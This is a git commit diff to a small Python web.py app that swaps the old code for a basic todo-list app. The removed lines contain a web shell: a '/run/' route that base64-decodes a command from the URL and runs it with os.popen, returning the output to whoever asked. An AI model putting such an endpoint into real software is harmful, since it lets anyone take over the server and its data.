8c00b04022436643c727f53608633ce260ba9973
tempdban <temp@dban.tk>
2016-01-13 21:09:25 +0800

    test

--- index.py
+++ index.py
@@ -1,26 +1,52 @@
-import web, os, base64
+import web
+import model
+
+### Url mappings
 
 urls = (
-    '/run/(.*)', 'runcommand',
-    '/(.*)', 'hello'
+    '/', 'Index',
+    '/del/(\d+)', 'Delete'
 )
+
+
+### Templates
+render = web.template.render('templates', base='base')
+
+
+class Index:
+
+    form = web.form.Form(
+        web.form.Textbox('title', web.form.notnull,
+            description="I need to:"),
+        web.form.Button('Add todo'),
+    )
+
+    def GET(self):
+        """ Show page """
+        todos = model.get_todos()
+        form = self.form()
+        return render.index(todos, form)
+
+    def POST(self):
+        """ Add new entry """
+        form = self.form()
+        if not form.validates():
+            todos = model.get_todos()
+            return render.index(todos, form)
+        model.new_todo(form.d.title)
+        raise web.seeother('/')
+
+
+
+class Delete:
+
+    def POST(self, id):
+        """ Delete based on ID """
+        id = int(id)
+        model.del_todo(id)
+        raise web.seeother('/')
+
+
 app = web.application(urls, globals())
-
-class hello:
-    def GET(self, name):
-        if not name:
-            name = 'Mopaas'
-        return 'Hello, ' + name + '!'
-
-class runcommand:
-    def GET(self, command):
-        str=''
-        if not command:
-            return
-        command = base64.b64decode(command)
-        tmp = os.popen(command).readlines()
-        for line in tmp:
-            str += line
-        return str
 
 application = app.wsgifunc()
